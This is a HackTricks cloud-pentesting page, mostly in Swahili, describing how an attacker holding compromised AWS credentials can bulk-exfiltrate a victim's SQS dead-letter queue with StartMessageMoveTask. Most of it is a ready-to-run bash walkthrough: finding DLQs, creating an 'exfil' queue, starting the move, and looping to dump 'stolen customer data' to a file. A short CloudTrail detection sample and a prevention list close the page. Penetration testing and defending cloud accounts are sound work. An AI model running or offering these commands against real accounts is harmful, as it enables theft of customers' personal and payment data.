# AWS â€“ SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## Maelezo

Tumia vibaya SQS message move tasks ili kuiba ujumbe wote uliokusanywa kutoka kwenye Dead-Letter Queue (DLQ) ya mwathiriwa kwa kuyapeleka kwa queue inayodhibitiwa na mshambulizi kwa kutumia `sqs:StartMessageMoveTask`. Mbinu hii inatumia kipengele halali cha AWS cha urejeshaji wa ujumbe ili exfiltrate data nyeti ambayo imekusanywa katika DLQs kwa muda.

## Je, Dead-Letter Queue (DLQ) ni nini?

Dead-Letter Queue ni queue maalum ya SQS ambapo ujumbe hupelekwa kiotomatiki wakati hayafanikiwa kuchakatwa vizuri na programu kuu. Ujumbe hizi zilizoshindwa mara nyingi zina:
- Data ya programu nyeti ambayo haikuweza kuchakatwa
- Maelezo ya makosa na taarifa za debugging
- Personal Identifiable Information (PII)
- API tokens, credentials, au siri nyingine
- Data muhimu za biashara za miamala

DLQs hufanya kama "makaburi" ya ujumbe walioshindwa, na kuzifanya kuwa malengo yenye thamani kwa sababu hukusanya data nyeti kwa muda ambayo programu zilishindwa kushughulikia ipasavyo.

## Senario ya Shambulio

**Mfano wa ulimwengu halisi:**
1. **E-commerce application** inachakata maagizo ya wateja kupitia SQS
2. **Maagizo mengine hukosa** (masuala ya malipo, uhaba wa hesabu, n.k.) na kuhamishwa kwenye DLQ
3. **DLQ inakusanya** wiki/miezi ya maagizo yaliyoshindwa yanayojumuisha data za wateja: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Mshambulizi anapata ufikiaji** wa credentials za AWS zenye permissions za SQS
5. **Mshambulizi anagundua** DLQ ina maelfu ya maagizo yaliyoshindwa yenye data nyeti
6. **Badala ya kujaribu kufikia ujumbe mmoja mmoja** (polepole na kuonekana), mshambulizi anatumia `StartMessageMoveTask` kuhamisha kwa wingi ujumbe WOTE kwenda queue yao
7. **Mshambulizi anatoa** data nyeti zote za kihistoria kwa operesheni moja

## Mahitaji
- Source queue lazima iwe imewekwa kama DLQ (irejewe na angalau queue moja kupitia RedrivePolicy).
- IAM permissions (kazi kama principal ya mwathiriwa aliyekompromiwa):
- Kwa DLQ (chanzo): `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- Kwa destination queue: permission ya kupeleka ujumbe (kwa mfano, queue policy inayoruhusu `sqs:SendMessage` kutoka kwa principal ya mwathiriwa). Kwa destinations za akaunti moja hii kwa kawaida inaruhusiwa kwa default.
- Ikiwa SSE-KMS imewezeshwa: kwa CMK ya source `kms:Decrypt`, na kwa CMK ya destination `kms:GenerateDataKey`, `kms:Encrypt`.

## Athari
Exfiltrate payloads nyeti zilizokusanywa katika DLQs (matukio yaliyoshindwa, PII, tokens, payloads za programu) kwa kasi kubwa kwa kutumia APIs za asili za SQS. Inafanya kazi cross-account ikiwa queue policy ya destination inaruhusu `SendMessage` kutoka kwa principal ya mwathiriwa.

## Jinsi ya Kutumia Vibaya

- Tambua ARN ya DLQ ya mwathiriwa na uhakikishe kwamba kweli inatajwa kama DLQ na queue fulani (queue yoyote inatosha).
- Tengeneza au chagua destination queue inayodhibitiwa na mshambulizi na pata ARN yake.
- Anzisha message move task kutoka DLQ ya mwathiriwa kwenda destination queue yako.
- Fatilia maendeleo au futilia mbali ikiwa inahitajika.

### CLI Mfano: Exfiltrating Customer Data from E-commerce DLQ

**Scenario**: Mshambulizi amekompromwa credentials za AWS na kugundua kwamba programu ya e-commerce inatumia SQS na DLQ yenye jaribio zilizoshindwa za usindikaji wa maagizo ya wateja.

1) **Gundua na uchunguze DLQ ya mwathiriwa**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **Unda attacker-controlled destination queue**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **Tekeleza wizi wa ujumbe kwa wingi**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **Kuvuna data nyeti zilizoibwa**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### Vidokezo vya cross-account
- The destination queue must have a resource policy allowing the victim principal to `sqs:SendMessage` (and, if used, KMS grants/permissions).

## Kwa Nini Shambulio Hili Lina Ufanisi

1. **Legitimate AWS Feature**: Inatumia uwezo uliomo ndani ya AWS, hivyo inafanya iwe vigumu kuibaini kama ni mbaya
2. **Bulk Operation**: Inahamisha maelfu ya ujumbe kwa haraka badala ya upatikanaji wa taratibu wa ujumbe mmoja mmoja
3. **Historical Data**: DLQs hukusanya data nyeti kwa wiki/miezi
4. **Under the Radar**: Mashirika mengi hayachunguzi upatikanaji wa DLQ kwa ukaribu
5. **Cross-Account Capable**: Inaweza exfiltrate kwenda kwenye akaunti ya AWS ya mshambuliaji ikiwa ruhusa zinaruhusu

## Ugunduzi na Kuzuia

### Ugunduzi
Fuatilia CloudTrail kwa wito wa API `StartMessageMoveTask` unaoshukiwa:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### Kuzuia
1. **Kanuni ya "Least Privilege"**: Punguza ruhusa za `sqs:StartMessageMoveTask` kwa majukumu yanayohitajika tu  
2. **Fuatilia DLQs**: Weka alarm za CloudWatch kwa shughuli zisizo za kawaida za DLQ  
3. **Sera za kuvuka akaunti**: Kagua kwa uangalifu SQS queue policies zinazoruhusu ufikiaji wa kuvuka akaunti  
4. **Fichamisha DLQs**: Tumia SSE-KMS na sera za funguo zenye vikwazo  
5. **Usafishaji wa kawaida**: Usiruhusu data nyeti ikusanyike katika DLQs bila kikomo

{{#include ../../../banners/hacktricks-training.md}}
